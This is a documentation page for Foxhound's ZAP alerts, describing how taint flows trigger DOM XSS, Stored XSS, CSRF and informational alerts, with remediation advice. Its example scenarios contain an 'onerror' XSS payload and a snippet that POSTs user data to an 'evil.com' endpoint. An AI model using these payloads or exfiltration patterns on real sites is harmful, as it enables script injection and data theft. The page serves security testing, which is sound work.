Alerts

Foxhound automatically analyzes taint flows and raises ZAP alerts for detected vulnerabilities. This page describes the alert types and how they're generated.

How Alerts Are Generated

Foxhound uses an event-driven alert system:

  1. When a taint flow is received, FoxhoundEventPublisher fires a TAINT_INFO_CREATED event
  2. FoxhoundAlertHelper listens for these events
  3. The helper runs vulnerability checks against the taint flow
  4. Each check examines the source+sink combination
  5. If a check matches, a ZAP alert is raised
  6. Alerts appear in ZAP's Alerts tab with full details

Alert Severity Levels:

  • High: Critical vulnerabilities (DOM XSS, Stored XSS)
  • Medium: Important vulnerabilities (CSRF)
  • Informational: General taint flow documentation

DOM XSS (Plugin ID: 40100)

Description

Detects DOM-based Cross-Site Scripting vulnerabilities where user-controlled data from URLs or inputs flows into dangerous JavaScript execution or HTML rendering sinks.

Risk Level

High - Allows attackers to execute arbitrary JavaScript in victim browsers

Detection Criteria

Alert raised when:

  • Sources: Data originates from URL or INPUT tagged sources
    • location.hash, location.search, location.href
    • document.URL, document.documentURI
    • window.name, document.referrer
    • Form input elements
  • Sinks: Data reaches XSS tagged sinks
    • eval(), Function() constructor
    • setTimeout(), setInterval() with string argument
    • innerHTML, outerHTML
    • document.write(), document.writeln()
    • insertAdjacentHTML()
    • location.href = ..., location = ...

Example Scenario

URL: https://example.com/page#<img src=x onerror=alert(1)>

JavaScript:
var hash = location.hash.substring(1);  // Source: location.hash
document.getElementById('output').innerHTML = hash;  // Sink: innerHTML

Result: XSS payload executes, Foxhound raises alert

Remediation

  • Never insert user-controlled data directly into HTML or JavaScript
  • Use textContent instead of innerHTML when possible
  • Sanitize and encode data before rendering:
    • HTML context: Use HTML entity encoding
    • JavaScript context: Use JavaScript string escaping
    • URL context: Use URL encoding
  • Implement Content Security Policy (CSP) to block inline scripts
  • Use frameworks with auto-escaping (React, Angular, Vue)

References

  • OWASP Top 10 2021: A03:2021 - Injection
  • OWASP Top 10 2017: A07:2017 - XSS
  • WSTG: CLNT-01 - DOM XSS

Stored XSS (Plugin ID: 40101)

Description

Detects stored (persistent) Cross-Site Scripting vulnerabilities where data from storage APIs flows into dangerous sinks.

Risk Level

High - Allows persistent attacks affecting all users who access stored data

Detection Criteria

Alert raised when:

  • Sources: Data originates from STORAGE tagged sources
    • localStorage.getItem()
    • sessionStorage.getItem()
    • document.cookie
  • Sinks: Data reaches XSS tagged sinks
    • Same sinks as DOM XSS (eval, innerHTML, etc.)

Example Scenario

// Attacker stores malicious data (via separate vulnerability)
localStorage.setItem('username', '<img src=x onerror=alert(1)>');

// Later, victim's browser reads and renders it
var username = localStorage.getItem('username');  // Source: localStorage
document.getElementById('welcome').innerHTML = 'Hello ' + username;  // Sink: innerHTML

Result: XSS payload executes for every user, Foxhound raises alert

Remediation

  • Never trust data from storage - it may have been poisoned
  • Validate and sanitize data before storing
  • Validate and encode data when retrieving from storage
  • Use textContent for rendering user data
  • Implement CSP to mitigate impact
  • Consider storing data on server-side instead of client-side

References

  • OWASP Top 10 2021: A03:2021 - Injection
  • OWASP: Cross-Site Scripting (XSS)

CSRF (Plugin ID: 40102)

Description

Detects potential Cross-Site Request Forgery vulnerabilities where storage data (potentially attacker-controlled) flows into network requests.

Risk Level

Medium - Allows attackers to forge requests on behalf of victims

Detection Criteria

Alert raised when:

  • Sources: STORAGE or URL tagged sources
  • Sinks: Network request sinks
    • XMLHttpRequest.open()
    • fetch()
    • location manipulation (for request forgery)

Note: This check is more heuristic and may produce false positives. Manual verification recommended.

Example Scenario

// Attacker manipulates stored data or URL
localStorage.setItem('apiEndpoint', 'https://evil.com/steal');

// Application uses stored data in request
var endpoint = localStorage.getItem('apiEndpoint');  // Source: localStorage
fetch(endpoint, {method: 'POST', body: userData});  // Sink: fetch

Result: Data sent to attacker-controlled endpoint, Foxhound raises alert

Remediation

  • Implement CSRF tokens for state-changing requests
  • Validate and whitelist URL destinations
  • Use SameSite cookie attribute
  • Verify request origin headers
  • Require re-authentication for sensitive operations
  • Never construct request URLs from untrusted data

References

  • OWASP: Cross-Site Request Forgery (CSRF)
  • OWASP WSTG: SESS-05 - CSRF

General Taint Info (Plugin ID: 40103)

Description

Documents all detected taint flows that don't match specific vulnerability patterns. Provides visibility into application data flows.

Risk Level

Informational - Not necessarily a vulnerability, but worth reviewing

Detection Criteria

Alert raised for:

  • Any taint flow that doesn't trigger DOM XSS, Stored XSS, or CSRF alerts
  • Flows with interesting source/sink combinations
  • All flows when comprehensive logging is needed

Purpose

  • Document data flow paths for security review
  • Identify unexpected data flows
  • Support manual security analysis
  • Provide audit trail of taint tracking

Example Scenarios

  • URL data flowing to console.log (no vulnerability, but interesting)
  • localStorage to JSON.parse (potential for injection if not validated)
  • Network response to DOM manipulation (may be safe if sanitized)

Action

  • Review these flows manually
  • Determine if they represent security risks
  • Consider if additional validation is needed
  • Use filters to focus on specific flow types

Alert Details

Alert Fields

Foxhound alerts include:

  • Name: Alert type (e.g., "DOM-based XSS (Foxhound)")
  • Risk: High, Medium, or Informational
  • Confidence: Medium (based on taint analysis)
  • URL: Page where vulnerability was detected
  • Description: Explanation of the vulnerability
  • Other Info: Taint flow details:
    • Tainted string flowing into sink
    • Sink name and parameters
    • Source(s) of tainted data
    • Complete operation chain
  • Solution: Remediation guidance
  • References: Links to OWASP and security resources
  • CWE ID: Common Weakness Enumeration identifier
  • WASC ID: Web Application Security Consortium identifier

Viewing Alert Details

  1. Click the Alerts tab in ZAP
  2. Expand the site tree to find Foxhound alerts
  3. Click an alert to view full details in the right panel
  4. Review the "Other Info" section for taint flow analysis
  5. Cross-reference with Foxhound panel for detailed flow visualization

False Positives

Common False Positive Scenarios

  • Data is sanitized/encoded but Foxhound doesn't track sanitization functions
  • CSP or other security controls prevent exploitation
  • Sink is in unreachable code path
  • Application uses a secure framework with auto-escaping

Handling False Positives

  • Manually verify each alert
  • Test exploitability in the actual application
  • Use filtering to reduce noise from specific sources/sinks
  • Report persistent false positives as issues on GitHub

Reducing False Positives

  • Disable sources/sinks that are known safe in your application
  • Focus testing on high-risk areas
  • Use manual confirmation for CSRF alerts
